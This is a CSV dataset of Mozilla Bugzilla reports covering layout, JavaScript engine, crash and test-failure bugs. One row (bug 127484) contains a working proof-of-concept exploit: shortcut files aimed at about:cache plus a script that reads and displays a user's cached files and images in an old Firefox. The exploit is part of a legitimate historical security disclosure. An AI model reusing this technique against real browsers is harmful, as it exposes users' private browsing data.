id,Component,Title,Description,Created_time,Resolved_time
201215,JavaScript Engine,Remove OBJECT_FLAG_FUNCTION,Created attachment 811223; Patch; ; Just noticed theres another unused flag. Theres one place where we check this flag but dont have to I think. If we ever need something like this we can just use TypeObject::clasp.,2013-09-27 10:33:44 -0700,2013-09-29 02:41:06 -0700
30777,XUL,Autocomplete popup has unnecessary scroll arrows,Linux trunk build 2000-11-01-06.  If the autocomplete popup window becomes large; enough; it requires scroll arrows.  Once it has gained these arrows; they are; always present; even if the autocomplete popup has only two entries.  They; should go away when they are not needed.,2000-11-01 19:30:40 -0800,2008-07-31 02:56:49 -0700
104701,Printing: Output,[FIX]js exploit via print preview,if a user is tricked to select print preview twice (the first time a; blank page is shown) it is possible to at least change his preferences.; ; the problem is execution of js coming from xbl in print preview and; probably a race condition helped by alert()s.; ; some trunk versions crash; some get exploited (had a hard time avoiding the; crashes).; ; testcase to follow.,2006-02-05 08:42:31 -0800,2009-07-15 08:19:06 -0700
127484,Networking: File,[FIX]mid-autumn festival vulnerability,Lui Dieyu in email reports:; ; For Firefox; location is wrong when dot URL shortcut is launched by HTML elements. Slightly variant from CVE-2008-2810 which is about command line and only fixed in that perspective. Contents at any location can be read by taking advantage of this error - cache information; cookie information; web; local file system; etc.; ; Here is proof of concept showing all cached images. Web page is required to be opened in local path or Windows share(UNC/SMB) path. Reproduced on Firefox 3.0.1 running on Windows XP SP3; US English.; ; -----testurl1.url-----; [InternetShortcut]; URL=about:cache?device=memory; IDList=; [{000214A0-0000-0000-C000-000000000046}]; Prop3=19;2; ; -----testurl2.url-----; [InternetShortcut]; URL=about:cache?device=disk; IDList=; [{000214A0-0000-0000-C000-000000000046}]; Prop3=19;2; ; -----test.html-----; <script>; function a(); {; s=;; h=;; for(i=0;i<window.frames.length;i++); {;     d=window.frames[i].document;;     for(j=0;j<d.links.length;j++);     {;         u=d.links[j].text;         s+=u+\n;;         h+=<img src=\+u+\>;;     }; }; document.getElementById(t).value=s;; document.getElementById(x).innerHTML=h;; }; </script>; <a href=javascript:a();>Start Test</a><br>; <a href=javascript:window.location=location.href>Load This Page Again</a><br>; <br>; <br>; <b>List of files that you recently fetched from the internet:</b><br>; <textarea rows=10 cols=100 id=t wrap=off></textarea>; <br>; <br>; <b>List of images that you recently viewed on the internet:</b><br>; <div id=x></div>; <br>; <br>; <iframe width=300 height=200 src=testurl1.url></iframe>; <iframe width=300 height=200 src=testurl2.url></iframe>,2008-09-15 06:10:37 -0700,2013-08-27 10:26:34 -0700
58461,Editor,textarea button2 paste goes haywire (middle-mouse paste),Pasting text with the middle button by clicking after the end of text in a; textarea form-entry box does not paste to the end of the buffer.  it goes; somewhere in the middle of the text.,2002-02-26 11:14:51 -0800,2002-02-27 09:55:46 -0800
101042,Security,Background images from http dont trigger broken lock icon (mixed content), ,2005-08-19 20:41:41 -0700,2012-10-18 12:54:05 -0700
93463,Plug-ins,Flash plugin installed but not always working In Firefox 0.10 (Preview release),User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10; Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20040913 Firefox/0.10; ; Macromedia Flash doesnt work in my install of Firefox 0.10.; ; I tried the Macromedia installer (Flash 7) and the auto-installer (Flash 6) and; neither work. I also tried the Macromedia uninstaller; (http://www.macromedia.com/shockwave/download/alternates/) and re-installing.; ; ; Reproducible: Always; Steps to Reproduce:; 1. Go to URL; 2. Click plugin icon to prompt for Flash plugin installation; 3. Install; 4. Restart FF for good measure; 5. Go to URL; ; Actual Results:  ; No Flash displayed; ; Expected Results:  ; Flash displayed; ; My machine is Windows XP; Service pack 2.; ; My bosss FF install also wouldnt show Flash (an older version of FF).; ; about:plugins lists the plugin:; ; ----8<----; ; Shockwave Flash; ;     File name: C:\Program Files\Mozilla Firefox\plugins\npswf32.dll;     Shockwave Flash 6.0 r79; ; MIME Type 	Description 	Suffixes 	Enabled; application/x-shockwave-flash 	Macromedia Flash movie 	swf 	Yes; application/futuresplash 	FutureSplash movie 	spl 	Yes; ; ----8<----; ; npswf32.dll is in the directory claimed.; ; Others are having problems in a thread on Mozillazine:; http://forums.mozillazine.org/viewtopic.php?t=124452&postdays=0&postorder=asc&postsperpage=15&start=0&sid=2123adb333e65437994a416683ad4674,2004-09-17 04:01:45 -0700,2004-10-22 14:59:38 -0700
100189,Event Handling,alert box loop breaks baycouples.com,When filling out the form; when you click the email field; an alert box pops; up. click on the alert boxs OK button; and the same alert pops up again.; ; the only way to get out of the alert box loop is to close the window. This will; sometimes result in application crash.,2005-07-11 08:57:27 -0700,2014-01-16 08:44:40 -0800
148864,JavaScript Engine,TM: followup for Bug 579100,Created attachment 460739; patch; ; a function declaration was not removed.,2010-07-27 19:22:40 -0700,2010-08-06 15:20:38 -0700
122478,Graphics,synthetic bold is not used for font-weight:bolder with fontconfig older than 2.3.92,See bug 333126 comment 63 and following.; ; This is really not a bug in Mozilla; but would be fixed by bug 419962.,2008-02-27 14:53:40 -0800,2011-10-07 09:10:05 -0700
165424,Layout: R & A Pos,jig.com looks different in aurora vs. firefox,Created attachment 556475; Screenshot of jig.com; ; I noticed some odd rendering issue in Aurora that I dont see in Firefox (same profile) or Chrome.; ; See attached.,2011-08-28 22:28:00 -0700,2013-12-27 14:29:23 -0800
171080,JavaScript Engine,Add Valueify/Jsvalify signatures for jsclass that work on const pointers,I have some and need it.,2012-01-31 09:03:29 -0800,2012-02-01 11:13:47 -0800
78959,DOM: Core & HTML,HTMLImageElement.src no longer works!,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2.1) Gecko/20021130; Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2.1) Gecko/20021130; ; In older versions of Mozilla as well as IE; assigning to HTMLImageElement.src; successfully changes the image.  Why is it not working anymore?!?  If there is a; more correct way to change the image; can someone tell me what it is?; ; I think that changing HTMLImageElement.src should be preserved for compatibility; with IE esp. if the alternative method is not as intuitive or compact.; ; If it IS a bug; it should be corrected ASAP as it is a very commonly used; functionality which used to work on older Mozillas.  This is the reason I am; reporting it as a bug on Mozilla 1.2.1 instead of a copy less than 2 weeks old.; ; Reproducible: Always; ; Steps to Reproduce:; Short sample code:; ; <html>; <head>;   <script language=javascript>;   <!--;   function pic1() {;     picnode=document.getElementById(pic);     picnode.src=pics/minusonly.gif;   };   function pic2() {;     picnode=document.getElementById(pic);     picnode.src=pics/plusonly.gif;   };   </script>; </head>; <body>;   <img id=pic onmouseover=pic1() onmouseout=pic2() src=pics/minusonly.gif>; </body>; </html>; ; Actual Results:  ; nothing happens.  The picture should have changed on mouse over.; ; Expected Results:  ; picture should have been replaced.,2003-02-28 16:35:32 -0800,2008-07-31 02:36:01 -0700
39197,Layout: Tables,text not wrapped; items left-justified instead of centered,This is a strange one - I cannot believe that no-one has noticed this as it has ; been happening for a while (maybe it is just my setup again). If I click on any ; of the links on the left-hand side; the thank you page has the text; graphics ; and button are all left-justified (they should be centered) and the text is not ; wrapped (it goes off the right-hand side of the screen). If I click on the button ; it jumps to the center where it should have been.; ; Note: Due to a new system here; I am no longer required to go through a proxy.,2001-04-30 02:19:11 -0700,2001-09-24 17:12:41 -0700
118752,Security: PSM,Cant log anymore into IMAP/SSL (or SMTP/SSL) servers having a bad certificate: no way to add an exception,[Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a9pre) Gecko/2007100303 SeaMonkey/2.0a1pre] (nightly) (W2Ksp4); ; I used to get; [; Website Certified by an Unknown Authority; ...; You are connected to a site pretending to be *; {...}; ]; ; I can accept the certificate or not :-); ; ; [Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.9a9pre) Gecko/2007100402 SeaMonkey/2.0a1pre] (nightly) (W2Ksp4); ; Now; I get; [; Alert; ...; (sec_error_ca_cert_invalid); ]; ; I can only press OK ... = No way to log in :-(; ; Im guessing this is a regression caused by 2007-10-03 04:52 / kaie%kuix.de / Bug 327181 !?,2007-10-04 04:59:29 -0700,2011-12-25 16:40:04 -0800
143803,js-ctypes,Implement variadic ctypes functions,Syntax would be something like; ;   let f = ctypes.FunctionType(ctypes.default_abi; ctypes.void_t; [ ctypes.int; ctypes.double; ctypes.varargs ]);; ; or something more imaginative. I *think* varargs implies cdecl on all platforms -- needs checking. So we could actually omit the ABI part; or -- crazy idea -- use ctypes.varargs_abi.; ; Now; contrary to varargs in C; we actually need to know all the types of the arguments in order for libffi to assemble them onto the stack correctly. Thus we would require; at call time; that each argument be a CData proper -- no ImplicitConvert.; ; So; once the syntax is nailed; the rest is easy.,2010-03-24 16:07:12 -0700,2012-04-06 06:51:15 -0700
199259,JavaScript Engine,Intermittent ggc Environment-callee-01.js | --baseline-eager: check(n()),https://tbpl.mozilla.org/php/getParsedLog.php?id=26693395&tree=Mozilla-Central#error1; Linux x86-64 mozilla-central leak test spidermonkey_tier_1-generational build on 2013-08-17 19:49:20 PDT for push bb269dc27eab; slave: bld-linux64-ec2-386; ; TIMEOUT - /builds/slave/m-cen_l64-d_sm-ggc-00000000000/src/js/src/jit-test/tests/debug/Environment-callee-01.js; TEST-UNEXPECTED-FAIL | /builds/slave/m-cen_l64-d_sm-ggc-00000000000/src/js/src/jit-test/tests/debug/Environment-callee-01.js | --baseline-eager: check(n()),2013-08-17 20:43:43 -0700,2014-01-07 04:35:14 -0800
104399,Document Navigation,[FIXr]Docshell should push null JSContext before calling window.open(),Otherwise the window and window watcher will use the wrong caller for the name search.  We need this on the 1.7 and 1.8.0 branches.  :(,2006-01-20 23:08:06 -0800,2006-07-14 13:29:38 -0700
76244,Security: UI,Missing error dialog with respect to spec.,In the description of the application/x-x509-user-cert; it says that if the; private key is missing; an error dialog is generated. I have tested this several; times and it doesnt happen.; ; Also; I guess by now I understand the purpose of this MIME type: It appears to; used if a user has uploaded a certificate signing request (CSR) and the CA after; signing will send back the signed certificate? If so; it would be great to add a; statement to this regard to the spec (see URL above).,2002-12-19 13:13:44 -0800,2008-07-10 02:22:41 -0700
124353,Security: PSM,occasionally get both alert and error page for certificate errors,Created attachment 318851; alert! no; really! (screenshot); ; I dont have an exact regression range; but it seems that recently (within the past few days? week?) I will see both a modal alert (popup on win32; sheet on OSX) describing certificate errors as well as the netError-like page in the browser.; ; Ive attached a screenshot.,2008-05-01 11:03:52 -0700,2008-12-17 18:20:59 -0800
159764,General,Input box viewport keeps returning to top when cursor down,User-Agent:       Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0; Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0; ; On a wiki or other such website; the input box viewport keeps returning to the top when the cursor down key is pressed.; ; ; ; Reproducible: Sometimes; ; Steps to Reproduce:; Create a file containing about 500 lines:; ; Line 1; Line 2; ...; ...; Line 500; ; Now try to edit one of the lines; cursor down to about line 100.; ; ; Actual Results:  ; The input box viewport returns to the top; so only the first so many lines are visible. (You cannot see line 100 to edit it).; ; Expected Results:  ; You should be able to see the line containing the cursor for edit.; ; This has been working for a couple of weeks; but today the problem is persistent. I cannot edit the online document because the viewport keeps rolling up.,2011-03-23 13:41:30 -0700,2011-05-02 19:48:01 -0700
186379,WebRTC: Audio/Video,Diagnose and fix stream underruns with getUserMedia,According to the logs in https://bugzilla.mozilla.org/show_bug.cgi?id=816664#c10; in the testcase(s) in that bug MediaStreamGraphImpl::WillUnderrun is showing underruns for the getUserMedia audio+video stream. We need to figure out why. It may be because we just havent received any audio data yet.,2012-12-02 17:53:08 -0800,2013-04-06 08:39:22 -0700
140184,JavaScript Engine,intermittent jsreftest failure in regress-469927.js,s: moz2-win32-slave16REFTEST TEST-UNEXPECTED-FAIL | file:///e:/builds/moz2_slave/mozilla-central-win32-unittest-everythingelse/build/jsreftest/tests/jsreftest.html?test=js1_8_1/trace/regress-469927.js | TM: jit should not slow down short loop with let Expected value true; Actual value false item 1; ; http://tinderbox.mozilla.org/showlog.cgi?log=Firefox-Unittest/1259252649.1259254958.8137.gz,2009-11-26 17:38:36 -0800,2012-11-25 19:31:12 -0800
192895,DOM,Intermittent browser_image.js | Exited with code 11 during test run | application crashed [@ libxul.so + 0x383db68] from mozilla::dom::ClearBroadcasterMapEntry,Peter; I see youve done some work around this code in FragmentOrElement.cpp. Can you take a look?; ; https://tbpl.mozilla.org/php/getParsedLog.php?id=21537935&tree=Mozilla-Inbound; ; Rev3 Fedora 12x64 mozilla-inbound debug test mochitest-browser-chrome on 2013-04-07 19:21:37 PDT for push bd072e286fc0; slave: talos-r3-fed64-015; ; 03:10:23     INFO -  TEST-START | chrome://mochitests/content/browser/image/test/browser/browser_image.js; 03:10:23     INFO -  ++DOCSHELL 0xc62cb50 == 10 [id = 5076]; 03:10:23     INFO -  ++DOMWINDOW == 118 (0xea1ed38) [serial = 13084] [outer = (nil)]; 03:10:23     INFO -  ++DOMWINDOW == 119 (0xf7f8cc8) [serial = 13085] [outer = 0xea1ed38]; 03:10:23     INFO -  WARNING: NS_ENSURE_TRUE(mMutable) failed: file ../../../../netwerk/base/src/nsSimpleURI.cpp; line 265; 03:10:23     INFO -  WARNING: NS_ENSURE_TRUE(mMutable) failed: file ../../../../netwerk/base/src/nsSimpleURI.cpp; line 265; 03:10:23     INFO -  ++DOMWINDOW == 120 (0xcdd4eb8) [serial = 13086] [outer = 0xea1ed38]; 03:10:23     INFO -  TEST-INFO | chrome://mochitests/content/browser/image/test/browser/browser_image.js | Console message: [JavaScript Error: The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outside the US-ASCII range. The character encoding of the page must be declared in the document or in the transfer protocol. {file: http://example.com/browser/image/test/browser/image.html line: 0}]; 03:10:26     INFO -  TEST-PASS | chrome://mochitests/content/browser/image/test/browser/browser_image.js | Must have animated a few frames so far; 03:10:26     INFO -  ++DOMWINDOW == 121 (0xcd4a9e8) [serial = 13087] [outer = 0xea1ed38]; 03:10:26     INFO -  WARNING: NS_ENSURE_TRUE(mMutable) failed: file ../../../../netwerk/base/src/nsSimpleURI.cpp; line 265; 03:10:27     INFO -  1365415827883	Services.DataReporting.Policy	DEBUG	Deletion request is scheduled for the future: Tue Apr 09 2013 02:33:55 GMT-0700 (PDT); 03:10:29     INFO -  --DOMWINDOW == 120 (0xdda7858) [serial = 13019] [outer = (nil)] [url = about:blank]; 03:10:29     INFO -  --DOMWINDOW == 119 (0xc5aaa48) [serial = 13051] [outer = (nil)] [url = about:blank]; 03:10:29     INFO -  --DOMWINDOW == 118 (0xf7f8cc8) [serial = 13085] [outer = 0xea1ed38] [url = about:blank]; 03:10:29     INFO -  --DOMWINDOW == 117 (0xd317768) [serial = 13039] [outer = (nil)] [url = about:blank]; 03:10:29     INFO -  --DOMWINDOW == 116 (0x2a0dba8) [serial = 13049] [outer = (nil)] [url = about:blank]; 03:10:29     INFO -  --DOMWINDOW == 115 (0xc535368) [serial = 13029] [outer = (nil)] [url = about:blank]; 03:10:30     INFO -  [debug] epoll_dispatch: epoll_wait reports 1; 03:10:30     INFO -  [debug] event_active: 0x7f678c0039a0 (fd 3); res 2; callback 0x7f679e1fdda0; 03:10:30     INFO -  [debug] event_process_active: event: 0x7f678c0039a0; EV_READ  call 0x7f679e1fdda0; 03:10:30     INFO -  [debug] event_del: 0x7f678c0039a0 (fd 3); callback 0x7f679e1fdda0; 03:10:30     INFO -  [debug] Epoll DEL(1) on fd 3 okay. [old events were 2; read change was 2; write change was 0]; 03:10:30     INFO -  [debug] event_base_loop: asked to terminate loop.; 03:10:30     INFO -  [debug] epoll_dispatch: epoll_wait reports 1; 03:10:30     INFO -  [debug] event_active: 0x7fcbb00039a0 (fd 3); res 2; callback 0x7fcbbeed2da0; 03:10:30     INFO -  [debug] event_process_active: event: 0x7fcbb00039a0; EV_READ  call 0x7fcbbeed2da0; 03:10:30     INFO -  [debug] event_del: 0x7fcbb00039a0 (fd 3); callback 0x7fcbbeed2da0; 03:10:30     INFO -  [debug] Epoll DEL(1) on fd 3 okay. [old events were 2; read change was 2; write change was 0]; 03:10:30     INFO -  [debug] event_base_loop: asked to terminate loop.; 03:10:30     INFO -  WARNING: shutting down early because of crash!: file ../../../../dom/plugins/ipc/PluginModuleChild.cpp; line 701; 03:10:30     INFO -  WARNING: plugin process _exit()ing: file ../../../../dom/plugins/ipc/PluginModuleChild.cpp; line 666; 03:10:30     INFO -  WARNING: shutting down early because of crash!: file ../../../../dom/plugins/ipc/PluginModuleChild.cpp; line 701; 03:10:30     INFO -  WARNING: plugin process _exit()ing: file ../../../../dom/plugins/ipc/PluginModuleChild.cpp; line 666; 03:10:31  WARNING -  TEST-UNEXPECTED-FAIL | chrome://mochitests/content/browser/image/test/browser/browser_image.js | Exited with code 11 during test run; 03:10:31     INFO -  INFO | automation.py | Application ran for: 0:47:17.916231; 03:10:31     INFO -  INFO | zombiecheck | Reading PID log: /tmp/tmpvgkfJOpidlog; 03:10:31     INFO -  ==> process 2326 launched child process 2389; 03:10:31     INFO -  ==> process 2326 launched child process 2400; 03:10:31     INFO -  ==> process 2326 launched child process 2404; 03:10:31     INFO -  ==> process 2326 launched child process 2407; 03:10:31     INFO -  ==> process 2326 launched child process 2410; 03:10:31     INFO -  INFO | zombiecheck | Checking for orphan process with PID: 2389; 03:10:31     INFO -  INFO | zombiecheck | Checking for orphan process with PID: 2400; 03:10:31     INFO -  INFO | zombiecheck | Checking for orphan process with PID: 2404; 03:10:31     INFO -  INFO | zombiecheck | Checking for orphan process with PID: 2407; 03:10:31     INFO -  INFO | zombiecheck | Checking for orphan process with PID: 2410; 03:10:43  WARNING -  PROCESS-CRASH | chrome://mochitests/content/browser/image/test/browser/browser_image.js | application crashed [@ libxul.so + 0x383db68]; 03:10:43     INFO -  Crash dump filename: /tmp/tmpz_9KWn/minidumps/54bd6823-07f2-01fb-0c905ee6-779e7ee8.dmp; 03:10:43     INFO -  Operating system: Linux; 03:10:43     INFO -                    0.0.0 Linux 2.6.31.5-127.fc12.x86_64 #1 SMP Sat Nov 7 21:11:14 EST 2009 x86_64; 03:10:43     INFO -  CPU: amd64; 03:10:43     INFO -       family 6 model 23 stepping 10; 03:10:43     INFO -       2 CPUs; 03:10:43     INFO -  Crash reason:  SIGSEGV; 03:10:43     INFO -  Crash address: 0x7f3ba9b6fb68; 03:10:43     INFO -  Thread 0 (crashed); 03:10:43     INFO -   0  libxul.so + 0x383db68; 03:10:43     INFO -      rbx = 0x0000000008e97fd0   r12 = 0x000000000aed85d8; 03:10:43     INFO -      r13 = 0x0000000000df7190   r14 = 0x000000000aa9cbd0; 03:10:43     INFO -      r15 = 0x000000000633a200   rip = 0x00007f3ba9b6fb68; 03:10:43     INFO -      rsp = 0x00007fffe39272e8   rbp = 0x00007fffe3927300; 03:10:43     INFO -      Found by: given as instruction pointer in context; 03:10:43     INFO -   1  libxul.so!nsINode::Slots() [nsINode.h:bd072e286fc0 : 1614 + 0x8]; 03:10:43     INFO -      rip = 0x00007f3ba6ec5842   rsp = 0x00007fffe39272f0; 03:10:43     INFO -      rbp = 0x00007fffe3927300; 03:10:43     INFO -      Found by: stack scanning; 03:10:43     INFO -   2  libxul.so!nsNodeWeakReference::~nsNodeWeakReference [FragmentOrElement.cpp:bd072e286fc0 : 473 + 0x4]; 03:10:43     INFO -      rip = 0x00007f3ba70f2290   rsp = 0x00007fffe3927310; 03:10:43     INFO -      rbp = 0x00007fffe3927320; 03:10:43     INFO -      Found by: stack scanning; 03:10:43     INFO -   3  libxul.so!nsNodeWeakReference::Release() [FragmentOrElement.cpp:bd072e286fc0 : 467 + 0x4]; 03:10:43     INFO -      rip = 0x00007f3ba70f23c7   rsp = 0x00007fffe3927330; 03:10:43     INFO -      rbp = 0x00007fffe3927350; 03:10:43     INFO -      Found by: stack scanning; 03:10:43     INFO -   4  libxul.so!mozilla::dom::ClearBroadcasterMapEntry [XULDocument.cpp:bd072e286fc0 : 652 + 0x7]; 03:10:43     INFO -      rip = 0x00007f3ba72cd2a6   rsp = 0x00007fffe3927360; 03:10:43     INFO -      rbp = 0x00007fffe3927380; 03:10:43     INFO -      Found by: stack scanning; 03:10:43     INFO -   5  libxul.so!PL_DHashTableFinish [pldhash.cpp:bd072e286fc0 : 362 + 0xb]; 03:10:43     INFO -      rip = 0x00007f3ba7dfe155   rsp = 0x00007fffe3927390; 03:10:43     INFO -      rbp = 0x00007fffe39273b0; 03:10:43     INFO -      Found by: stack scanning; 03:10:43     INFO -   6  libxul.so!PL_DHashTableDestroy [pldhash.cpp:bd072e286fc0 : 192 + 0x4]; 03:10:43     INFO -      rip = 0x00007f3ba7dfe224   rsp = 0x00007fffe39273c0; 03:10:43     INFO -      rbp = 0x00007fffe39273d0; 03:10:43     INFO -      Found by: stack scanning,2013-04-08 08:37:55 -0700,2013-08-22 05:04:22 -0700
120976,Security: UI,Steps to reproduce from Bug 402749 crash Mac and Linux Debug Builds,Created attachment 296398; crash stack; ; During the verification of Bug 402479 my Debug Build crashs.; This crash was also reported in Bug 408601; ; Another Crash stack is https://bugzilla.mozilla.org/attachment.cgi?id=295994; ; Steps to reproduce:; 1. Get an https error page by loading https://dave.sni.velox.ch/.; 2. Click the Or you can add an exception... link.; 3. Click the Add exception button.; 4. Press Esc to close the dialog.; 5. Cmd+Q.; ; Apple Crash Report:; ; #; Date/Time:      2008-01-10 11:42:55.440 -0800; #; OS Version:     10.4.11 (Build 8S2167); #; Report Version: 4; #;  ; #; Command: firefox-bin; #; Path:    ./firefox-bin; #; Parent:  sh [3516]; #;  ; #; Version: 3.0b3pre (3.0b3pre); #;  ; #; PID:    3522; #; Thread: 0; #;  ; #; Exception:  EXC_BREAKPOINT (0x0006); #; Code[0]:    0x00000002; #; Code[1]:    0x00000000; #;  ; #;  ; #; Thread 0 Crashed:; #; 0   libmozjs.dylib              0x0146e706 JS_Assert + 66 (jsutil.c:63); #; 1   libmozjs.dylib              0x013ba279 js_SetContextThread + 155 (jscntxt.c:178); #; 2   libmozjs.dylib              0x013b1680 JS_SetContextThread + 60 (jsapi.c:5658); #; 3   libxpconnect.dylib          0x13038bfe XPCJSContextStack::~XPCJSContextStack [in-charge deleting]() + 56 (xpcthreadcontext.cpp:61); #; 4   libxpconnect.dylib          0x13038171 XPCPerThreadData::Cleanup() + 151 (xpcthreadcontext.cpp:487); #; 5   libxpconnect.dylib          0x130382b6 XPCPerThreadData::~XPCPerThreadData [in-charge]() + 52 (xpcthreadcontext.cpp:500); #; 6   libxpconnect.dylib          0x13038399 xpc_ThreadDataDtorCB(void*) + 41 (xpcthreadcontext.cpp:532); #; 7   libnspr4.dylib              0x005b489d _PR_DestroyThreadPrivate + 193 (prtpd.c:266); #; 8   libnspr4.dylib              0x005d1f31 _pt_thread_death_internal + 165 (ptthread.c:834); #; 9   libnspr4.dylib              0x005d1e8a _pt_thread_death + 25 (ptthread.c:813); #; 10  libnspr4.dylib              0x005d1905 PR_JoinThread + 241 (ptthread.c:600); #; 11  libpipnss.dylib             0x3cc47af8 nsPSMBackgroundThread::requestExit() + 120 (nsPSMBackgroundThread.cpp:98); #; 12  libpipnss.dylib             0x3cc4fae0 nsNSSComponent::DoProfileChangeNetTeardown() + 36 (nsNSSComponent.cpp:2320); #; 13  libpipnss.dylib             0x3cc57232 nsNSSComponent::Observe(nsISupports*; char const*; unsigned short const*) + 1992 (nsNSSComponent.cpp:2069); #; 14  libxpcom_core.dylib         0x016b2f7b nsObserverList::NotifyObservers(nsISupports*; char const*; unsigned short const*) + 97 (nsObserverList.cpp:127); #; 15  libxpcom_core.dylib         0x016b3625 nsObserverService::NotifyObservers(nsISupports*; char const*; unsigned short const*) + 333 (nsObserverService.cpp:184); #; 16  XUL                         0x0021760b nsXREDirProvider::DoShutdown() + 291 (nsXREDirProvider.cpp:836); #; 17  XUL                         0x00207b20 ScopedXPCOMStartup::~ScopedXPCOMStartup [in-charge]() + 124 (nsAppRunner.cpp:896); #; 18  XUL                         0x0020f26e XRE_main + 7312 (nsAppRunner.cpp:3248); #; 19  org.mozilla.firefox         0x00002798 main + 708 (nsBrowserApp.cpp:158); #; 20  org.mozilla.firefox         0x00001dca _start + 216; #; 21  org.mozilla.firefox         0x00001cf1 start + 41; #;  ; #; Thread 1:; #; 0   libSystem.B.dylib           0x9001a1cc select + 12; #; 1   libnspr4.dylib              0x005cf6c8 _pr_poll_with_poll + 1333 (ptio.c:3899); #; 2   libnspr4.dylib              0x005cf936 PR_Poll + 31 (ptio.c:4303); #; 3   libnecko.dylib              0x13d9224d nsSocketTransportService::Poll(int; unsigned*) + 223 (nsSocketTransportService2.cpp:346); #; 4   libnecko.dylib              0x13d936a1 nsSocketTransportService::DoPollIteration(int) + 803 (nsSocketTransportService2.cpp:641); #; 5   libnecko.dylib              0x13d939af nsSocketTransportService::OnProcessNextEvent(nsIThreadInternal*; int; unsigned) + 61 (nsSocketTransportService2.cpp:519); #; 6   libxpcom_core.dylib         0x016fbcfd nsThread::ProcessNextEvent(int; int*) + 415 (nsThread.cpp:500); #; 7   libxpcom_core.dylib         0x016a12a5 NS_ProcessNextEvent_P(nsIThread*; int) + 129 (nsThreadUtils.cpp:227); #; 8   libnecko.dylib              0x13d931f7 nsSocketTransportService::Run() + 293 (nsSocketTransportService2.cpp:550); #; 9   libxpcom_core.dylib         0x016fbe01 nsThread::ProcessNextEvent(int; int*) + 675 (nsThread.cpp:511); #; 10  libxpcom_core.dylib         0x016a12a5 NS_ProcessNextEvent_P(nsIThread*; int) + 129 (nsThreadUtils.cpp:227); #; 11  libxpcom_core.dylib         0x016fc00e nsThread::ThreadFunc(void*) + 262 (nsThread.cpp:253); #; 12  libnspr4.dylib              0x005d0eb7 _pt_root + 313 (ptthread.c:224); #; 13  libSystem.B.dylib           0x90024227 _pthread_body + 84; #,2008-01-10 13:10:37 -0800,2008-02-06 05:04:29 -0800
190955,General,Add number of bytes requested to OOM last-gasp,Currently; when memory allocation fails; the only diagnostic printed to the; log messages is a simple out of memory string. It would be useful in; distinguishing from a true out-of-memory situation and a request for; an unrealistically large block of memory if the message included the; size of the requested allocation.,2013-02-28 09:26:36 -0800,2013-03-17 17:38:15 -0700
180788,Layout,Crash zooming page with -moz-columns containing a float,Created attachment 652402; Backtrace of a crash.; ; User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1; Build ID: 20120717144008; ; Steps to reproduce:; ; Experimenting with -moz-columns.; ; Note this crash also occurs on the nightly 17 branch.; ; ; Actual results:; ; Sometimes crashes when zooming.,2012-08-16 05:11:50 -0700,2013-04-04 17:07:03 -0700
143329,DOM: Core & HTML,Adding empty href attribute doesnt add link styling,Created attachment 432012; testcase (dynamic),2010-03-11 16:19:56 -0800,2010-06-16 16:48:49 -0700
194613,Security,CSP dev console warnings and errors look the same.,(Creating this because I want to fix this particular issue in a separate bug); ; When logging to the dev console; there is currently no UI guidance of whether something is a warning or an error.; All CSP violations are Errors and CSP-meta things (e.g.; somebody sending the old header) are Warnings.; ; It would be helpful to do what happens with JavaScript Errors and Warnings:; There is a tiny grey triangle with an exclamation mark for warnings and an x mark for errors (console.warn`` and console.error`` provide examples),2013-05-13 04:40:53 -0700,2013-05-16 17:40:29 -0700
